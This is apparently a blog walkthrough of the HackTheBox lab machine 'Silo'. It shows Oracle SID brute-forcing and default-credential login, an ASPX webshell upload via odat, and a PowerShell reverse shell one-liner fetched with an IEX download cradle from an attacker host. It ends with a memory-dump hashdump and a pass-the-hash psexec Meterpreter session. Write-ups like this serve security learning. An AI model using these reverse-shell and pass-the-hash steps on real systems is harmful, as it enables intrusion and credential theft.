---
layout: post
title: Hackthebox Silo Walkthrough
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2019-11-06/silo-badge.png)
# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
To learn a new technique/knowledge, solve all machines (As much as possible!!).<br>
This is a walkthrough of a box "Silo".<br>

# Solution
### 1. Initial Enumeration

TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.82 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-06 15:58 EET
Nmap scan report for 10.10.10.82
Host is up (0.047s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49161/tcp open  msrpc        Microsoft Windows RPC
49162/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2m19s, deviation: 0s, median: 2m18s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-11-06T14:51:29
|_  start_date: 2019-11-06T14:00:27

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3066.66 seconds
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.82/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.aspx -s '200,204,301,302,403'
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.82/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,aspx
[+] Timeout:        10s
===============================================================
2019/11/06 16:54:45 Starting gobuster
===============================================================
===============================================================
2019/11/06 18:05:09 Finished
===============================================================
{% endhighlight %}

### 2. Getting User

Sounds we have nothing interesting on port 80 HTTP.<br>
Then, try to take a look at Oracle TNS listener.<br>
At first, try to get SIDs.<br>
<br>
<em>The Oracle System ID (SID) is used to uniquely identify a particular database on a system. For this reason, one cannot have more than one database with the same SID on a computer system.</em>
{% highlight shell %}
msf5 auxiliary(admin/oracle/sid_brute) > use auxiliary/admin/oracle/sid_brute 
msf5 auxiliary(admin/oracle/sid_brute) > set rhost 10.10.10.82
rhost => 10.10.10.82
msf5 auxiliary(admin/oracle/sid_brute) > show options

Module options (auxiliary/admin/oracle/sid_brute):

   Name     Current Setting                                         Required  Description
   ----     ---------------                                         --------  -----------
   RHOSTS   10.10.10.82                                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    1521                                                    yes       The target port (TCP)
   SIDFILE  /usr/share/metasploit-framework/data/wordlists/sid.txt  no        The file that contains a list of sids.
   SLEEP    1                                                       no        Sleep() amount between each request.

msf5 auxiliary(admin/oracle/sid_brute) > run
[*] Running module against 10.10.10.82

[*] 10.10.10.82:1521 - Starting brute force on 10.10.10.82, using sids from /usr/share/metasploit-framework/data/wordlists/sid.txt...
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'XE'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'PLSExtProc'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'CLRExtProc'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID ''
[*] 10.10.10.82:1521 - Done with brute force...
[*] Auxiliary module execution completed
{% endhighlight %}

Next, try some default credentials.<br>
We can find the list in the <a href="https://docs.oracle.com/cd/B19306_01/install.102/b25300/rev_precon_db.htm">Oracle Database Installation Guide</a>.<br>
This time, following credential worked.<br>
{% highlight shell %}
scott:tiger
{% endhighlight %}
{% highlight shell %}
root@kali:/opt/oracle/instantclient_19_3# ./sqlplus SCOTT/tiger@10.10.10.82:1521/XE

SQL*Plus: Release 19.0.0.0.0 - Production on Wed Nov 6 18:24:53 2019
Version 19.3.0.0.0

Copyright (c) 1982, 2019, Oracle.  All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
{% endhighlight %}

For the Oracle penetration testing, we can use a script "<a href="https://github.com/quentinhardy/odat">odat.py</a>".<br>
It is not installed by default, we have to install with "apt-get"<br>
{% highlight shell %}
apt-get install odat
{% endhighlight %}

Then, upload a aspx webshell which is installed on Kali linux by default.<br>
To upload a file, we need an option "dbmsadvisor".
{% highlight shell %}
root@kali:~# odat dbmsadvisor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot cmdasp.aspx /usr/share/webshells/aspx/cmdasp.aspx 

[1] (10.10.10.82:1521): Put the /usr/share/webshells/aspx/cmdasp.aspx local file in the C:\inetpub\wwwroot path (named cmdasp.aspx) of the 10.10.10.82 server
[+] The /usr/share/webshells/aspx/cmdasp.aspx local file was put in the remote C:\inetpub\wwwroot path (named cmdasp.aspx)
{% endhighlight %}
![placeholder](https://inar1.github.io/public/images/2019-11-06/2019-11-06-18-39-38.png)

To launch a netcat listener to receive a reverse shell.
{% highlight shell %}
root@kali:~# nc -nlvp 443
listening on [any] 443 ...

{% endhighlight %}

After that, make a script for the reverse shell, we can use <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1">this Powershell script</a>.<br>
{% highlight shell %}
root@kali:~# cat Invoke-PowerShellTcpOneLine.ps1 
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.13',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

$sm=(New-Object Net.Sockets.TCPClient('10.10.14.13',443)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
{% endhighlight %}

Next, run a simple web server that hosts the powershell script.
{% highlight shell %}
root@kali:~# ls -l | grep Invoke
-rw-r--r-- 1 root root  973 Nov  6 18:47 Invoke-PowerShellTcpOneLine.ps1

root@kali:~# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...

{% endhighlight %}

Then invoke the powershell script, we have to run following command with the webshell.
{% highlight shell %}
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13/Invoke-PowerShellTcpOneLine.ps1')
{% endhighlight %}

Now we got a reverse shell.<br>
user.txt is in the directory "Directory: C:\users\Phineas\Desktop".
{% highlight shell %}
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.82] 49174
cwd
PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool

PS C:\windows\system32\inetsrv> type C:\users\Phineas\Desktop\user.txt
92ede778a1cc8d27cb6623055c331617
{% endhighlight %}


### 3. Getting Root

There is another file in the same directory which name is "Oracle issue.txt" with password.
{% highlight shell %}
PS C:\users\Phineas\Desktop> dir


    Directory: C:\users\Phineas\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---          1/5/2018  10:56 PM        300 Oracle issue.txt                  
-a---          1/4/2018   9:41 PM         32 user.txt                          


PS C:\users\Phineas\Desktop> type "Oracle issue.txt"
Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):

Dropbox link provided to vendor (and password under separate cover).

Dropbox link 
https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0

link password:
?%Hm8646uC$
{% endhighlight %}

Then, try to access to the dropbox.<br>
However, above password doesn't work. To obtain a correct password, we need to use the webshell which we uploaded.<br>
After that, download the file "SILO-20180105-221806.zip".
![placeholder](https://inar1.github.io/public/images/2019-11-06/2019-11-06-19-06-31.png)
{% highlight shell %}
£%Hm8646uC$
{% endhighlight %}
![placeholder](https://inar1.github.io/public/images/2019-11-06/2019-11-06-19-08-14.png)

By unzip, we can get a file which contains memory dump.<br>
We can use "<a href="https://github.com/volatilityfoundation/volatility">volatility</a>" which is installed by default to do the investigation.<br>
At first, dump the profile of "SILO-20180105-221806.dmp".
{% highlight shell %}
root@kali:~# volatility kdbgscan -f SILO-20180105-221806.dmp
Volatility Foundation Volatility Framework 2.6
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow

~~~

**************************************************
Instantiating KDBG using: Unnamed AS Win2012x64 (6.2.9201 64bit)
Offset (V)                    : 0xf80078520a30
Offset (P)                    : 0x2320a30
KdCopyDataBlock (V)           : 0xf8007845f9b0
Block encoded                 : Yes
Wait never                    : 0xd08e8400bd4a143a
Wait always                   : 0x17a949efd11db80
KDBG owner tag check          : True
Profile suggestion (KDBGHeader): Win2012x64
Version64                     : 0xf80078520d90 (Major: 15, Minor: 9600)
Service Pack (CmNtCSDVersion) : 0
Build string (NtBuildLab)     : 9600.16384.amd64fre.winblue_rtm.
PsActiveProcessHead           : 0xfffff80078537700 (51 processes)
PsLoadedModuleList            : 0xfffff800785519b0 (148 modules)
KernelBase                    : 0xfffff8007828a000 (Matches MZ: True)
Major (OptionalHeader)        : 6
Minor (OptionalHeader)        : 3
KPCR                          : 0xfffff8007857b000 (CPU 0)
KPCR                          : 0xffffd000207e8000 (CPU 1)

~~~

{% endhighlight %}

We figured out the OS is "Windows server 2012 64bit".<br>
Then, take a look at the registory hive.
{% highlight shell %}
root@kali:~# volatility -f SILO-20180105-221806.dmp --profile=Win2012R2x64 hivelist
Volatility Foundation Volatility Framework 2.6
Virtual            Physical           Name
------------------ ------------------ ----
0xffffc0000100a000 0x000000000d40e000 \??\C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat
0xffffc000011fb000 0x0000000034570000 \SystemRoot\System32\config\DRIVERS
0xffffc00001600000 0x000000003327b000 \??\C:\Windows\AppCompat\Programs\Amcache.hve
0xffffc0000001e000 0x0000000000b65000 [no name]
0xffffc00000028000 0x0000000000a70000 \REGISTRY\MACHINE\SYSTEM
0xffffc00000052000 0x000000001a25b000 \REGISTRY\MACHINE\HARDWARE
0xffffc000004de000 0x0000000024cf8000 \Device\HarddiskVolume1\Boot\BCD
0xffffc00000103000 0x000000003205d000 \SystemRoot\System32\Config\SOFTWARE
0xffffc00002c43000 0x0000000028ecb000 \SystemRoot\System32\Config\DEFAULT
0xffffc000061a3000 0x0000000027532000 \SystemRoot\System32\Config\SECURITY
0xffffc00000619000 0x0000000026cc5000 \SystemRoot\System32\Config\SAM
0xffffc0000060d000 0x0000000026c93000 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0xffffc000006cf000 0x000000002688f000 \SystemRoot\System32\Config\BBI
0xffffc000007e7000 0x00000000259a8000 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0xffffc00000fed000 0x000000000d67f000 \??\C:\Users\Administrator\ntuser.dat
{% endhighlight %}

We found a some files should be confidential.<br>
To dump the hash, wehave to provide the needed addresses for SYSTEM and SAM.
{% highlight shell %}
root@kali:~# volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump -y 0xffffc00000028000 -s 0xffffc00000619000
Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
{% endhighlight %}

Since we can use Pass the Hash technique for Windows,<br>
we can achieve a SYSTEM shell with metasploit psexec module.
{% highlight shell %}
msf5 > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > set smbuser Administrator
smbuser => Administrator
msf5 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7
smbpass => aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7
msf5 exploit(windows/smb/psexec) > set rhost 10.10.10.82
rhost => 10.10.10.82
msf5 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.14.13:4444 
[*] 10.10.10.82:445 - Connecting to the server...
[*] 10.10.10.82:445 - Authenticating to 10.10.10.82:445 as user 'Administrator'...
[*] 10.10.10.82:445 - Selecting PowerShell target
[*] 10.10.10.82:445 - Executing the payload...
[+] 10.10.10.82:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (180291 bytes) to 10.10.10.82
[*] Meterpreter session 1 opened (10.10.14.13:4444 -> 10.10.10.82:49175) at 2019-11-06 19:24:15 +0200

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
{% endhighlight %}

As always, root.txt is in the directory "C:\Users\Administrator\Desktop".
{% highlight shell %}
meterpreter > shell
Process 1884 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>type C:\users\administrator\desktop\root.txt
type C:\users\administrator\desktop\root.txt
cd39ea0af657a495e33bc59c7836faf6
C:\Windows\system32>
{% endhighlight %}
